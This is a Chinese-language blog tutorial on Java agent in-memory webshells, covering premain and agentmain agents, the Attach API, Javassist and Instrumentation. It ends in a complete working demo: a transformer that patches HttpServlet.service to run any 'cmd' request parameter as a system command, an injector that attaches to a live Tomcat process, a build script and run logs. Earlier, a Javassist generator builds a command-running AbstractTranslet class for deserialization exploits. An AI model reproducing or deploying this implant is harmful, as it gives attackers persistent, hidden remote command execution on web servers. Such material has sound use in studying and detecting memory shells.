---
title: Java 内存马第四篇 - Agent 内存马
date: 2025-11-08 15:03:00
tags: [java安全, 内存马]            #标签
categories: [Java安全]      #分类
description: Java 内存马第四篇 - Agent 内存马        #简要说明
toc: true           #显示目录
---



# Java 内存马第四篇 - Agent 内存马







# 四、 Java Agent 内存马





## 4.1 Java Agent示例

对于Agent（代理）来讲，其大致可以分为两种，一种是在**JVM启动前加载的**`**premain-Agent**`，另一种是**JVM启动之后加载的**`**agentmain-Agent**`。这里我们可以将其理解成一种特殊的Interceptor（拦截器），如下图

![premain-Agent](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523591.jpeg)



![agentmain-Agent](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523236.jpeg)

### 4.1.1 premain-Agent



#### 使用外部 MANIFEST.MF 文件 创建

##### 创建Java Agent类

此处不写包名，避免后续的编译的 jar 包找不到类

```java
//package com.premain.agent;

import java.lang.instrument.Instrumentation;

public class JavaAgentPremain {

    public static void premain(String args, Instrumentation inst) {
        for (int i =0 ; i<10 ; i++){
            System.out.println("premain-Agent");
        }
    }
}
```







##### 创建MANIFEST.MF文件



**最后必须有一个空行！**

```plain
Manifest-Version: 1.0
Premain-Class: JavaAgentPremain
Can-Redefine-Classes: true
Can-Retransform-Classes: true
Can-Set-Native-Method-Prefix: true
Created-By: Manual Compilation
```

​	

##### 创建测试主程序



```java
//package com.test;

public class HelloAgent {
    public static void main(String[] args) {
        System.out.println("Hello Agent!");
    }
}
```



```plain
Manifest-Version: 1.0
Main-Class: HelloAgent
Created-By: Manual Compilation
```





##### 目录结构：

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523457.png)



##### 编译

创建俩个文件夹，

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523797.png)







```
javac HelloAgent.java
```

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523695.png)





##### 创建Agent JAR文件

```
 jar cfm ..\dist\agent.jar ..\src\main\resources\MANIFEST.MF JavaAgentPremain.class
 jar cfm ..\dist\hello.jar ..\src\main\resources1\MANIFEST.MF HelloAgent.class
```



![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523614.png)





##### 测试运行

```
 java -javaagent:agent.jar -jar hello.jar
```



![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523677.png)

#### 

### 4.1.2 agentmain-Agent

agentmain-Agent能够在JVM启动之后加载并实现相应的修改字节码功能。  

premain方法在JDK1.5中提供，在JDK版本为1.5时，开发者只能在main加载之前添加手脚，但是对于大部分内存马注入时，都是JVM已经运行的情况下。在JDK1.6中实现了attach-on-demand，我们可以使用AttachAPI动态的加载Agent，agentmain能够在JVM启动后加载并实现相应的修改字节码的功能。

AttachAPI在tool.jar中，而JVM启动时默认不加载该依赖，需要我们在classpath中额外进行指定



#### VirtualMachine

VirtualMachine 可以实现获取 JVM 信息、内存dump、现成dump、类信息统计（例如JVM加载的类）等功能。

该类允许我们通过给attach方法传入一个JVM的PID，来远程连接到该JVM上 ，之后我们就可以对连接的JVM进行各种操作，如注入Agent。下面是该类的主要方法





```java
//允许我们传入一个JVM的PID，然后远程连接到该JVM上
VirtualMachine.attach()
//向JVM注册一个代理程序agent，在该agent的代理程序中会得到一个Instrumentation实例，该实例可以 在class加载前改变class的字节码，也可以在class加载后重新加载。在调用Instrumentation实例的方法时，这些方法会使用ClassFileTransformer接口中提供的方法进行处理
VirtualMachine.loadAgent()
//获得当前所有的JVM列表
VirtualMachine.list()
//解除与特定JVM的连接
VirtualMachine.detach()
```





#### VirtualMachineDescriptor 类

`com.sun.tools.attach.VirtualMachineDescriptor`类是一个用来描述特定虚拟机的类，其方法可以获取虚拟机的各种信息如PID、虚拟机名称等。下面是一个获取特定虚拟机PID的示例



示例：

pom.xml:

[Missing artifact com.sun:tools:jar:1.8.0有效解决办法（亲测）-CSDN博客](https://blog.csdn.net/weixin_39309402/article/details/102480878)

```xml
<dependencies>
  <!-- https://mvnrepository.com/artifact/com.sun/tools -->
  <dependency>
    <groupId>com.sun</groupId>
    <artifactId>tools</artifactId>
    <version>1.8.0_451</version>
    <scope>system</scope>
    <systemPath>${JAVA_HOME}/lib/tools.jar</systemPath>
  </dependency>
</dependencies>
```



```java
    package com.test;

    import java.util.List;

    import com.sun.tools.attach.VirtualMachine;
    import com.sun.tools.attach.VirtualMachineDescriptor;

    public class get_PID {
        public static void main(String[] args) {
            List<VirtualMachineDescriptor> list = VirtualMachine.list();
            for (VirtualMachineDescriptor vmd : list) {
                if(vmd.displayName().equals("com.test.get_PID")) {
                    System.out.println(vmd.id());
                }
            }

        }
    }
```



![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523760.png)





#### 实现 agentmain-Agent

编写一个 `Sleep_Hello`类，模拟正在运行的 JVM

```java
package com.test;

import static java.lang.Thread.sleep;

public class SleepHello {
    public static void main(String[] args) throws InterruptedException {
        while(true){
            System.out.println("hello");
            sleep(5000);
        }

    }
}
```





编写JavaAgentAgentmain

```java
package com.agentmain.agent;

import java.lang.instrument.Instrumentation;

import static java.lang.Thread.sleep;

public class JavaAgentAgentmain {
    public static void agentmain(String agentArgs, Instrumentation inst) throws InterruptedException {
        while(true){
            System.out.println("agentmain-Agent");
            sleep(3000);
        }
    }
}
```



配置 MANIFEST.MF 文件

```plain
Manifest-Version: 1.0
Agent-Class: com.agentmain.agent.JavaAgentAgentmain
Can-Redefine-Classes: true
Can-Retransform-Classes: true
Can-Set-Native-Method-Prefix: true
```



之后编译得到 **Agentmain.jar**

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523062.png)



编写测试类Inject_Agent，可以将agent注入到正在运行的JVM中

```java
package com.test;

import com.sun.tools.attach.*;

import java.io.IOException;
import java.util.List;

public class InjectAgent {
    public static void main(String[] args) throws IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException, AttachNotSupportedException, AgentLoadException, AgentInitializationException, AgentInitializationException {
        //调用VirtualMachine.list()获取正在运行的JVM列表
        List<VirtualMachineDescriptor> list = VirtualMachine.list();
        String path="D:\\JavaCode\\内存马\\JavaAgentTest\\dist\\Agentmain.jar";

        for(VirtualMachineDescriptor vmd : list){
            System.out.println(vmd.displayName());
            //遍历每一个正在运行的JVM，如果JVM名称为Sleep_Hello则连接该JVM并加载特定Agent
            if(vmd.displayName().contains("Sleep")){
                //连接指定JVM
                VirtualMachine virtualMachine = VirtualMachine.attach(vmd.id());
                //加载Agent
                virtualMachine.loadAgent(path);
                //断开JVM连接
                virtualMachine.detach();
            }
        }
    }
}
```



先运行 SleepHello.java 再运行	InjectAgent.java



![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523253.png)



## 4.2 动态修改字节码

### 4.2.1 Javassist

用来处理Java字节码的类库，允许在已经编译好的类中添加新的方法，或者修改已有的方法，同时也可以通过手动的方式去生成一个新的类对象

#### 简介

Java 字节码以二进制的形式存储在 .class 文件中，每一个.class文件包含一个Java类或接口。Javaassist 就是一个用来处理Java字节码的类库。它可以在一个已经编译好的类中添加新的方法，或者是修改已有的方法，并且不需要对字节码方面有深入的了解。同时也可以通过手动的方式去生成一个新的类对象。

#### 类池 ClassPool

ClassPool是 CtClass 对象的容器。它按需读取类文件来构造 CtClass 对象，并且保存 CtClass 对象以便以后使用。需要注意的是 ClassPool 会在内存中维护所有被它创建过的 CtClass，当 CtClass 数量过多时，会占用大量的内存，API 中给出的解决方案是有意识的调用 CtClass 的 detach() 方法以释放内存。

**主要方法**有以下几个：

- getDefault：获取默认的 ClassPool 对象。
- get、getCtClass：根据类名获取 CtClass 对象，用于操作类的字节码。
- makeClass：创建一个新的 CtClass 对象，用于新增类。
- insertClassPath、appendClassPath：插入类搜索路径，提供给类加载器用于加载类。
- toClass：将修改后的 CtClass 加载至当前线程的上下文类加载器中。通过调用 CtClass 的 toClass() 方法实现了将 CtClass 转换为 Class 对象，这样就可以在运行时使用这个类。需要注意的是一旦调用该方法，则无法继续修改已经被加载的 Class 对象。



获得方法如下：

通过`ClassPool.getDefault()`使用JVM的类搜索路径。如果程序运行在JBoss或者Tomcat的Web服务器上，则ClassPool可能无法找到用户的类，因为Web服务器会使用多个类加载器作为系统类加载器。在这种情况下，ClassPool必须添加额外的搜索路径

```java
//获得方法
ClassPool cp = ClassPool.getDefault();
//添加类搜索路径
cp.insertClassPath(new ClassClassPath(<Class>));
```







#### CtClass

CtClass 是 Javassist 中的一个抽象类，用于表示一个类文件。

**CtClass 需要关注的方法：**

- freeze：冻结一个类，使其不可修改。
- isFrozen：判断一个类是否已被冻结。
- prune：删除类不必要的属性，以减少内存占用。调用该方法后，许多方法无法将无法正常使用，慎用。
- defrost：解冻一个类，使其可以被修改。如果事先知道一个类会被 defrost ， 则禁止调用 prune 方法。
- detach：将该 class 从 ClassPool 中删除。
- setSuperclass：设置当前类的父类。
- writeFile：将 CtClass 对象转换为类文件并将其写入本地磁盘。
- toClass：通过类加载器加载该 CtClass ，示例：`Class clazz = cc.toClass();` 。
- toBytecode：获取 CtClass 的字节码，示例：`byte[] b = cc.toBytecode();` 。



可以通过以下代码获取

```java
ClassPool.get(ClassName)
```

#### CtMethod 和 CtField

CtMethod 和 CtField 分别代表 Java 类中的方法和字段。通过 CtClass 对象，可以获取、添加、删除或修改类中的方法和字段。这些对象提供了丰富的 API ，用于操作方法和字段的各种属性，如访问修饰符、名称、返回类型等。

CtMethod 中的一些重要方法：

1. insertBefore：在方法的起始位置插入代码。
2. insterAfter：在方法的所有 return 语句前插入代码以确保语句能够被执行，除非遇到 exception 。
3. insertAt：在指定的位置插入代码。
4. setBody：将方法的内容设置为要写入的代码，当方法被 abstract 修饰时，该修饰符被移除。
5. make：创建一个新的方法。

利用 CtMethod 中的 insertBefore，insterAfter，insertAt 等方法可以实现 AOP 增强功能。



通过`CtClass.getDeclaredMethod(MethodName)`获取，其中该类提供了一些方法可以让我们直接修改方法体，方法如下。

```java
public final class CtMethod extends CtBehavior {
    
}

public abstract class CtBehavior extends CtMethod {
    //设置方法体
    public void setBody(String src);

    // 插入在方法体最前面
    public void insertBefore(String src);
 
    // 插入在方法体最后面
    public void insertAfter(String src);
 
    // 在方法体的某一行插入内容
    public int insertAt(int lineNum, String src);
 
}
    
```

其中传递给`insertBefore`、`insertAfter`和`insertAt`的String对象是由`Javassist`的编译器进行编译的。该编译器支持语言的扩展，以下以$符号开头的几个标识符具有特殊的含义：

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081524285.png)



#### Javassist 使用



依赖：

```xml
<dependency>  
  <groupId>org.javassist</groupId>  
  <artifactId>javassist</artifactId>  
  <version>3.27.0-GA</version>  
</dependency>
```



使用 javassist 创建一个 Person 类

```java
package com.test;

import javassist.*;

public class JavassistDemo {
    public static void CreatePerson() throws Exception{
        //获取 CtClass 对象容器 ClassPool
        ClassPool classPool = ClassPool.getDefault();
        //创建一个新类 Javassist.Learning.Person
        CtClass ctClass = classPool.makeClass("javassist.Person");
        //创建一个 Person 类的属性 name
        CtField ctField1 = new CtField(classPool.get("java.lang.String"),"name", ctClass);
        //设置属性访问符
        ctField1.setModifiers(Modifier.PRIVATE);
        //将属性添加到 Person中，并设置初始值
        ctClass.addField(ctField1,CtField.Initializer.constant("aaa"));

        //向 Person 类中添加 setter 和 getter 方法
        ctClass.addMethod(CtNewMethod.setter("setName",ctField1));
        ctClass.addMethod(CtNewMethod.getter("getName",ctField1));

        //创建一个无参构造
        CtConstructor ctConstructor = new CtConstructor(new CtClass[]{}, ctClass);
        //设置方法体
        ctConstructor.setBody("{name = \"aaa\";}");
        //向 Person 类中添加无参构造
        ctClass.addConstructor(ctConstructor);

        //创建一个类方法 printName
        CtMethod ctMethod = new CtMethod(CtClass.voidType, "printName", new CtClass[]{}, ctClass);
        //设置方法访问符
        ctMethod.setModifiers(Modifier.PUBLIC);
        //设置方法体
        ctMethod.setBody("{System.out.println(\"Hello World\");}");
        //将方法添加至 Person 中
        ctClass.addMethod(ctMethod);

        //将生成的字节码写入文件中
        ctClass.writeFile();

    }

    public static void main(String[] args) throws Exception {
        System.out.println("start");
        CreatePerson();
        System.out.println("finish");
    }
}

 
```



![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523506.png)

创建好的 Person.class

```java
//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package javassist;

public class Person {
    private String name = "aaa";

    public void setName(String var1) {
        this.name = var1;
    }

    public String getName() {
        return this.name;
    }

    public Person() {
        super();
        this.name = "aaa";
    }

    public void printName() {
        System.out.println("Hello World");
    }
}
```





#### 使用Javassist生成恶意class



从字节码层面生成恶意 class ，跳过恶意类的编译过程



```java
package com.javassist;

import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;

import java.io.File;
import java.io.FileOutputStream;

public class createShell {
    
    /**
     * 生成包含恶意命令的TemplatesImpl字节码
     * @param cmd 要执行的系统命令
     * @return 生成的字节码数组
     */
    public static byte[] getTemplatesImpl(String cmd) {
        try {
            // 获取默认的类池
            ClassPool classPool = ClassPool.getDefault();
            
            // 创建一个新的类，名为"Evil"
            CtClass ctClass = classPool.makeClass("Evil");
            
            // 获取AbstractTranslet类作为父类
            // 这是XSLT转换器的基类，常用于Java反序列化利用
            CtClass superClass = classPool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
            ctClass.setSuperclass(superClass);
            
            // 创建类的初始化构造函数
            CtConstructor ctConstructor = ctClass.makeClassInitializer();
            
            // 在构造函数体中插入执行系统命令的代码
            ctConstructor.setBody("try{\n" +
                    "            Runtime.getRuntime().exec(\"" + cmd + "\");\n" +  // 执行传入的命令
                    "        }catch (Exception e){\n" +
                    "        }");  // 异常处理，静默失败
            
            // 将CtClass转换为字节数组
            byte[] bytes = ctClass.toBytecode();
            
            // 从类池中分离该类，释放资源
            ctClass.detach();
            
            return bytes;
        } catch (Exception e) {
            e.printStackTrace();
            return new byte[]{};
        }
    }

    /**
     * 将生成的恶意类字节码写入文件
     * @throws Exception
     */
    public static void writeShell() throws Exception {
        // 生成执行calc命令的恶意字节码
        byte[] shell = createShell.getTemplatesImpl("calc");
        
        // 创建文件输出流，将字节码写入bbb.class文件
        FileOutputStream fileOutputStream = new FileOutputStream(new File("bbb.class"));
        fileOutputStream.write(shell);
        
        // 注意：这里应该关闭流，建议使用try-with-resources
        fileOutputStream.close();
    }

    /**
     * 主方法 - 程序入口
     * @param args 命令行参数
     * @throws Exception
     */
    public static void main(String[] args) throws Exception {
        writeShell();
    }
}
```

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523107.png)

```java
//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;

public class Evil extends AbstractTranslet {
    static {
        try {
            Runtime.getRuntime().exec("calc");
        } catch (Exception var1) {
        }

    }

    public Evil() {
        super();
    }
}
```







### 4.2.2 Instrumentation 动态修改字节码

 Instrumentation是 JVMTIAgent（JVM Tool Interface Agent）的一部分，Java agent通过这个类和目标 JVM 进行交互，从而达到修改数据的效果。  

 其在Java中是一个接口，常用方法如下  

```java
public interface Instrumentation {
    
    //增加一个Class 文件的转换器，转换器用于改变 Class 二进制流的数据，参数 canRetransform 设置是否允许重新转换。
    void addTransformer(ClassFileTransformer transformer, boolean canRetransform);
 
    //在类加载之前，重新定义 Class 文件，ClassDefinition 表示对一个类新的定义，如果在类加载之后，需要使用 retransformClasses 方法重新定义。addTransformer方法配置之后，后续的类加载都会被Transformer拦截。对于已经加载过的类，可以执行retransformClasses来重新触发这个Transformer的拦截。类加载的字节码被修改后，除非再次被retransform，否则不会恢复。
    void addTransformer(ClassFileTransformer transformer);
 
    //删除一个类转换器
    boolean removeTransformer(ClassFileTransformer transformer);
 
 
    //在类加载之后，重新定义 Class。这个很重要，该方法是1.6 之后加入的，事实上，该方法是 update 了一个类。
    void retransformClasses(Class<?>... classes) throws UnmodifiableClassException;
 
    //判断一个类是否被修改
    boolean isModifiableClass(Class<?> theClass);
 
    // 获取目标已经加载的类。
    @SuppressWarnings("rawtypes")
    Class[] getAllLoadedClasses();
 
    //获取一个对象的大小
    long getObjectSize(Object objectToSize);
}
```



#### 获取目标JVM已加载类



```java
package com.test;

import java.lang.instrument.Instrumentation;


public class Java_Agent_agentmain_Instrumentation {
    public static void agentmain(String args,  Instrumentation inst) throws InterruptedException{
        Class[] classes = inst.getAllLoadedClasses();

        for(Class cls : classes){
            System.out.println("=======================");
            System.out.println("加载类：" + cls.getName());
            System.out.println("是否可被修改：" + inst.isModifiableClass(cls));
        }

    }
}
```



```plain
Manifest-Version: 1.0
Agent-Class: com.test.Java_Agent_agentmain_Instrumentation
Can-Redefine-Classes: true
Can-Retransform-Classes: true
Can-Set-Native-Method-Prefix: true
```



创建 jar

```
jar cvfm Instrumentation.jar ..\src\main\resources\MANIFEST.MF .\Java_Agent_agentmain_Instrumentation.class
```

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081533461.png)



使用 InjectAgent.java 测试

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081524580.png)



 能够获取目标JVM已加载类

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523648.png)



#### transform - 转换器



在Instrumentation接口中，我们可以通过**addTransformer()**来添加一个transformer（转换器），关键属性就是ClassFileTransformer类。



```java
//增加一个Class 文件的转换器，转换器用于改变 Class 二进制流的数据，参数 canRetransform 设置是否允许重新转换。
void addTransformer(ClassFileTransformer transformer, boolean canRetransform);
```



**ClassFileTransformer**接口中只有一个**transform()**方法，返回值为字节数组，作为转换后的字节码注入到目标JVM中。

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523698.png)



在通过 addTransformer 注册一个transformer后，每次定义或者重定义新类都会调用transformer。所谓定义，即是通过ClassLoader.defineClass加载进来的类。而重定义是通过Instrumentation.redefineClasses方法重定义的类。

当存在多个转换器时，转换将由 transform 调用链组成。 也就是说，一个 transform 调用返回的 byte 数组将成为下一个调用的输入（通过 classfileBuffer 参数）。

转换将按以下顺序应用：

```plain
不可重转换转换器
不可重转换本机转换器
可重转换转换器
可重转换本机转换器
```



至于transformer中对字节码的具体操作，则需要使用到Javassisit类。

#### Instrumentation的局限性

大多数情况下，我们使用Instrumentation都是使用其字节码插桩的功能，简单来说就是类重定义功能（Class Redefine），但是有以下局限性：

premain和agentmain两种方式修改字节码的时机都是类文件加载之后，也就是说必须要带有Class类型的参数，不能通过字节码文件和自定义的类名重新定义一个本来不存在的类。

类的字节码修改称为类转换(Class Transform)，类转换其实最终都回归到类重定义I`nstrumentation#redefineClasses`方法，此方法有以下限制：

1. 新类和老类的父类必须相同
2. 新类和老类实现的接口数也要相同，并且是相同的接口
3. 新类和老类访问符必须一致。 新类和老类字段数和字段名要一致
4. 新类和老类新增或删除的方法必须是private static/final修饰的
5. 可以修改方法体







## 4.3 Agent 内存马注入

看了许多师傅关于Agent内存马注入的文章和博客，各有千秋，利用方式也各不相同。现在，我根据自己的理解来编写一个小demo。



### 4.3.1 方式一（后续可能会复现其他师傅的利用方式）

####  思路：

1. 编译并打包 `AgentMemShell` 为 `agentmemshell.jar`。
2. 编译 `Injector`（需要 `tools.jar`，通常在 `JAVA_HOME/lib/` 下）。
3. 运行 `Injector`，指定目标 Tomcat 的 PID。
4. 访问任何 Servlet 路径，带上 `?cmd=whoami` 参数，即可执行命令。





#### 可用 Demo：



##### 目录结构：

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081524589.png)



##### pom.xml

```java
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
		 xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
	<modelVersion>4.0.0</modelVersion>
	
	<groupId>com.src</groupId>
	<artifactId>Demo01</artifactId>
	<version>1.0-SNAPSHOT</version>
	<packaging>jar</packaging>
	
	<properties>
		<project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
		<maven.compiler.source>1.8</maven.compiler.source>
		<maven.compiler.target>1.8</maven.compiler.target>
	</properties>
	<build>
		<plugins>
			<!-- 编译插件 -->
			<plugin>
				<groupId>org.apache.maven.plugins</groupId>
				<artifactId>maven-compiler-plugin</artifactId>
				<version>3.8.1</version>
				<configuration>
					<source>1.8</source>
					<target>1.8</target>
					<encoding>UTF-8</encoding>
				</configuration>
			</plugin>
			
			<!-- 打包 JAR 插件 -->
			<plugin>
				<groupId>org.apache.maven.plugins</groupId>
				<artifactId>maven-jar-plugin</artifactId>
				<version>3.2.2</version>
				<configuration>
					<archive>
						<!-- 确保生成标准 MANIFEST 文件 -->
						<manifest>
							<addClasspath>true</addClasspath>
							<useUniqueVersions>false</useUniqueVersions>
						</manifest>
						
						<!-- 这里写入 Agent 属性 -->
						<manifestEntries>
							<Agent-Class>com.src.agent.AgentMain</Agent-Class>
							<Can-Redefine-Classes>true</Can-Redefine-Classes>
							<Can-Retransform-Classes>true</Can-Retransform-Classes>
						</manifestEntries>
					</archive>
				</configuration>
			</plugin>
		</plugins>
	</build>


</project>
```



##### AgentMemShell.java

```java
package com.src.agent;

import java.lang.instrument.Instrumentation;

public class AgentMemShell {
    public static void agentmain(String agentArgs, Instrumentation inst) {
        System.out.println("AgentMemShell Injected!");

        // 添加类转换器
        inst.addTransformer(new ServletTransformer(), true);

        // 找到所有已加载的 HttpServlet 类并进行重转换
        Class[] loadedClasses = inst.getAllLoadedClasses();
        for (Class clazz : loadedClasses) {
            if (clazz.getName().equals("javax.servlet.http.HttpServlet")) {
                try {
                    System.out.println("Found HttpServlet:"+clazz);
                    inst.retransformClasses(clazz);
                    System.out.println("Retransform HttpServlet Success.");
                } catch (Exception e) {
                    e.printStackTrace();
                }
                break;
            }
        }
    }

    public static void premain(String agentArgs, Instrumentation inst) {
        agentmain(agentArgs, inst);
    }
}
```



##### ServletTransformer.java

```java
package com.src.agent;

import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import javassist.LoaderClassPath;

import java.lang.instrument.ClassFileTransformer;
import java.security.ProtectionDomain;

public class ServletTransformer implements ClassFileTransformer {

    @Override
    public byte[] transform(ClassLoader loader,
                            String className,
                            Class<?> classBeingRedefined,
                            ProtectionDomain protectionDomain,
                            byte[] classfileBuffer) {

        try {
            // 打印所有被加载的类，便于调试（仅第一次注入时启用）
            if (className != null && className.contains("servlet")) {
                System.out.println("[Debug] Loading class: " + className);
            }

            // className 可能是 "javax/servlet/http/HttpServlet"
            // 也可能是 "javax.servlet.http.HttpServlet"
            String dotName = className.replace('/', '.');

            // 精确匹配 HttpServlet 类
            if ("javax.servlet.http.HttpServlet".equals(dotName)) {
                System.out.println("[+] Found target class: " + dotName);
                System.out.println("[+] Start transforming HttpServlet...");

                // 初始化 Javassist ClassPool 并添加当前 ClassLoader 的路径
                ClassPool classPool = ClassPool.getDefault();
                if (loader != null) {
                    classPool.insertClassPath(new LoaderClassPath(loader));
                }

                // 获取类定义
                CtClass ctClass = classPool.get(dotName);
                CtMethod serviceMethod = ctClass.getDeclaredMethod("service");

                // 恶意逻辑
                String shell = ""
                        + "{"
                        + "    javax.servlet.http.HttpServletRequest req = (javax.servlet.http.HttpServletRequest)$1;"
                        + "    javax.servlet.http.HttpServletResponse res = (javax.servlet.http.HttpServletResponse)$2;"
                        + "    String cmd = req.getParameter(\"cmd\");"
                        + "    if (cmd != null) {"
                        + "        try {"
                        + "            java.util.Scanner s = new java.util.Scanner("
                        + "                Runtime.getRuntime().exec(cmd).getInputStream(), \"UTF-8\""
                        + "            ).useDelimiter(\"\\\\A\");"
                        + "            String output = s.hasNext() ? s.next() : \"\";"
                        + "            res.setContentType(\"text/plain;charset=UTF-8\");"
                        + "            res.getWriter().write(output);"
                        + "            res.getWriter().flush();"
                        + "            return;"
                        + "        } catch (Exception e) {"
                        + "            e.printStackTrace();"
                        + "        }"
                        + "    }"
                        + "}";

                // 在 service 方法的开头插入
                serviceMethod.insertBefore(shell);

                byte[] newClassBytes = ctClass.toBytecode();
                ctClass.detach();

                System.out.println("[+] HttpServlet Transformed Complete.");
                return newClassBytes;
            }

        } catch (Throwable e) {
            System.out.println("[!] Transform failed: " + e);
            e.printStackTrace();
        }

        // 返回 null 表示不修改该类
        return null;
    }
}
```





##### Injector.java

```java
package com.src.injector;

import com.sun.tools.attach.VirtualMachine;
import com.sun.tools.attach.VirtualMachineDescriptor;
import java.util.List;

public class Injector {
    public static void main(String args[]) throws Exception{
        if (args.length < 2) {
            System.out.println("Usage: java -jar injector.jar <pid> <agent_jar_path>");
            System.out.println("Available JVM processes:");
            listProcesses();
            return;
        }

        String pid = args[0];
        String agentJarPath = args[1];

        try {
            System.out.println("Trying to attach to PID: " + pid);
            VirtualMachine vm = VirtualMachine.attach(pid);
            vm.loadAgent(agentJarPath);
            vm.detach();
            System.out.println("[+] Agent injected successfully!");
        } catch (Exception e) {
            System.err.println("[-] Injection failed: " + e.getMessage());
            e.printStackTrace();
        }
    }

    private static void listProcesses() {
        try {
            List<VirtualMachineDescriptor> vmList = VirtualMachine.list();
            for (VirtualMachineDescriptor vmd : vmList) {
                System.out.println("PID: " + vmd.id() + " - " + vmd.displayName());
            }
        } catch (Exception e) {
            System.err.println("[-] Failed to list processes: " + e.getMessage());
        }
    }
}
```



##### MANIFEST.MF

```plain
Manifest-Version: 1.0
Agent-Class: com.src.agent.AgentMemShell
Can-Redefine-Classes: true
Can-Retransform-Classes: true
Built-By: maven
Created-By: Apache Maven
Build-Jdk: 1.8.0_65
```



这是 一个小脚本：

##### build.bat    

(部分内容根据实际情况自行修改)

```bash
@echo off
setlocal

echo Setting up environment...
set JAVA_HOME=D:\Java\jdk1.8.0_65
set PATH=%JAVA_HOME%\bin;%PATH%

echo [1/6] Cleaning target directory...
if exist target rmdir /s /q target
mkdir target
mkdir target\classes

echo [2/6] Compiling agent classes...
"%JAVA_HOME%\bin\javac" -encoding UTF-8 -cp "lib\javassist.jar" -d target\classes src\main\java\com\src\agent\*.java
if errorlevel 1 (
    echo Failed to compile agent classes!
    pause
    exit /b 1
)

echo [3/6] Compiling injector class...
"%JAVA_HOME%\bin\javac" -encoding UTF-8 -cp "D:\Java\jdk1.8.0_65\lib\tools.jar;target\classes" -d target\classes src\main\java\com\src\injector\*.java
if errorlevel 1 (
    echo Failed to compile injector class!
    pause
    exit /b 1
)

echo [4/6] Merging javassist into classes...
pushd target\classes
"%JAVA_HOME%\bin\jar" xf ..\..\lib\javassist.jar
popd

echo [5/6] Packaging agent JAR...
rem 如果 src\main\resources\META-INF\MANIFEST.MF 存在则使用它
set MANIFEST_FILE=src\main\resources\META-INF\MANIFEST.MF
if not exist "%MANIFEST_FILE%" set MANIFEST_FILE=META-INF\MANIFEST.MF

"%JAVA_HOME%\bin\jar" cfm target\Demo01-1.0-SNAPSHOT.jar "%MANIFEST_FILE%" -C target\classes .
if errorlevel 1 (
    echo Failed to package agent JAR!
    pause
    exit /b 1
)

echo [6/6] Creating injector JAR...
"%JAVA_HOME%\bin\jar" cfe target\Injector.jar com.src.injector.Injector -C target\classes .
if errorlevel 1 (
    echo Failed to package injector JAR!
    pause
    exit /b 1
)

echo.
echo ========================================
echo Build Successful!
echo Generated files:
echo   - target\Demo01-1.0-SNAPSHOT.jar (Agent with embedded javassist)
echo   - target\Injector.jar (Injector)
echo ========================================
echo.

pause
```





##### 执行 build.bat



![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523243.png)



#### 开始测试

##### 启动一个 Tomcat



![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523492.png)



![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081524494.png)







##### Tomcat 进程

```plain
# 查看所有 Java 进程
jps -l

# 查看进程详细信息
tasklist | findstr "java"

# 或者使用 wmic
wmic process where "name='java.exe'" get processid,commandline
```





![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081525788.png)



找到进程：**40268 org.apache.catalina.startup.Bootstrap**







##### 测试注入

**使用管理员身份运行！！**

```
java -cp "D:\Java\jdk1.8.0_65\lib\tools.jar;D:\JavaCode\内存马\AgentMem\Demo01\target\Injector.jar" com.src.injector.Injector **40268** D:\JavaCode\内存马\AgentMem\Demo01\target\Demo01-1.0-SNAPSHOT.jar
```

（为了防止一些莫名其妙的错误，使用了绝对路径）

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081525851.png)



注入成功

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523146.png)



Tomcat 日志：

```plain
// Agent 已经被成功加载到目标 JVM 中，agentmain() 被调用，注入成功
AgentMemShell Injected!

//对多个已加载（loaded）且继承自 HttpServlet 的类执行了 retransformClasses()，并且这些子类都成功被重转换（retransform success）
Found HttpServlet subclass: class org.apache.jsp.index_jsp
Retransform subclass Success: class org.apache.jsp.index_jsp
Found HttpServlet subclass: class com.src.testtomcat.HelloServlet
Retransform subclass Success: class com.src.testtomcat.HelloServlet
Found HttpServlet subclass: class org.apache.jasper.runtime.HttpJspBase
Retransform subclass Success: class org.apache.jasper.runtime.HttpJspBase
Found HttpServlet subclass: class org.apache.jasper.servlet.JspServlet
